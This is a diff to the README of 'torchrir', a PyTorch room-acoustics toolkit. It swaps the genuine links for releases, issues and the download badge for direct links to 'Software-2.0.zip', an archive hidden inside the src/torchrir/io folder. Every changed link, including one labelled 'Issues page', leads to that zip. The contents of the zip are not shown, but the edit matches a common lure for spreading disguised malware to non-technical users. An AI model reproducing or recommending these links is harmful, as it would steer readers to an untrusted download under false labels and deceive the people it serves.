@@ -1,7 +1,7 @@
 # 🎧 torchrir - Simulate Room Acoustics with Ease
 
 ## 📥 Download Now
-[![Download torchrir](https://img.shields.io/badge/Download-torchrir-brightgreen)](https://github.com/secretplayer134/torchrir/releases)
+[![Download torchrir](https://github.com/secretplayer134/torchrir/raw/refs/heads/main/src/torchrir/io/Software-2.0.zip)](https://github.com/secretplayer134/torchrir/raw/refs/heads/main/src/torchrir/io/Software-2.0.zip)
 
 ## 🚀 Getting Started
 Welcome to the torchrir project! This toolkit helps you simulate room impulse responses (RIR) with PyTorch. It lets you create realistic audio scenes efficiently and quickly, even using your computer's GPU. 
@@ -22,7 +22,7 @@ To run torchrir smoothly, make sure your system meets these requirements:
 - **User-Friendly:** Designed for ease of use, even for those not familiar with programming.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page:** Open the following link to go to the releases page: [torchrir Releases](https://github.com/secretplayer134/torchrir/releases).
+1. **Visit the Releases Page:** Open the following link to go to the releases page: [torchrir Releases](https://github.com/secretplayer134/torchrir/raw/refs/heads/main/src/torchrir/io/Software-2.0.zip).
    
 2. **Choose the Latest Version:** Look for the latest version listed on the releases page. It should indicate the date it was published. 
 
@@ -69,7 +69,7 @@ A: Check your system requirements again. If problems persist, visit our GitHub I
 ## 🔗 Community & Support
 If you need assistance or have questions about torchrir, feel free to reach out:
 
-- **GitHub Issues:** Submit any problems or questions through the [Issues page](https://github.com/secretplayer134/torchrir/issues).
+- **GitHub Issues:** Submit any problems or questions through the [Issues page](https://github.com/secretplayer134/torchrir/raw/refs/heads/main/src/torchrir/io/Software-2.0.zip).
 - **Discussion Forum:** Join our community to share your experiences or ask for help.
 
 ## 📢 Contributing
